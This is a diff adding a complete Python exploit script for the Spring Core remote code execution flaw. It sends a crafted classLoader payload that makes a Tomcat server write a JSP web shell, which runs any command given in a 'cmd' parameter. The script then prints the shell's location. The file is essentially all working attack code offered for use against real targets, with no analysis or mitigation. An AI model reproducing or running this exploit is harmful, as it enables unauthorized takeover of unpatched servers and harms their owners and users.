@@ -1,0 +1,61 @@
+# Author: @Rezn0k
+# Based off the work of p1n93r
+
+import requests
+import argparse
+from urllib.parse import urlparse
+
+
+def Exploit(url, directory, filename):
+    headers = {"suffix":"%>//",
+                "c1":"Runtime",
+                "c2":"<%",
+                "DNT":"1",
+                "Content-Type":"application/x-www-form-urlencoded"
+    }
+
+    data = f"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals" \
+           f"(%22j%22))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter" \
+           f"(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B" \
+           f"%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&" \
+           f"class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader." \
+           f"resources.context.parent.pipeline.first.directory={directory}&class.module.classLoader.resources.context." \
+           f"parent.pipeline.first.prefix={filename}&class.module.classLoader.resources.context.parent.pipeline.first." \
+           f"fileDateFormat="
+    try:
+        # Run exploit
+        requests.post(url, headers=headers, data=data, timeout=15, allow_redirects=False, verify=False)
+
+    except Exception as e:
+        print(e)
+        pass
+
+
+def main():
+    parser = argparse.ArgumentParser(description='Spring Core RCE')
+    parser.add_argument('-url',help='target url', required=True)
+    parser.add_argument('-f', help='File to write to [no extension]', required=True)
+    parser.add_argument('--directory', help='Directory to write to. Suggest using "webapps/[appname]" of target app',
+                        required=False, default="webapps/ROOT")
+
+    filename = parser.parse_args().f.replace(".jsp", "")
+
+    args = parser.parse_args()
+    if args.url:
+        try:
+            Exploit(args.url, args.directory, filename)
+            print("[+] Exploit completed")
+            print("[+] Check your target for a shell")
+            print("[+] File: " + filename + ".jsp")
+
+            if args.directory:
+                location = urlparse(args.url).scheme + "://" + urlparse(args.url).netloc + "/" + filename + ".jsp"
+            else:
+                location = f"Unknown. Custom directory used. (try app/{filename}.jsp?cmd=id"
+            print(f"[+] Shell should be at: {location}?cmd=id")
+        except Exception as e:
+            print(e)
+
+
+if __name__ == '__main__':
+    main()
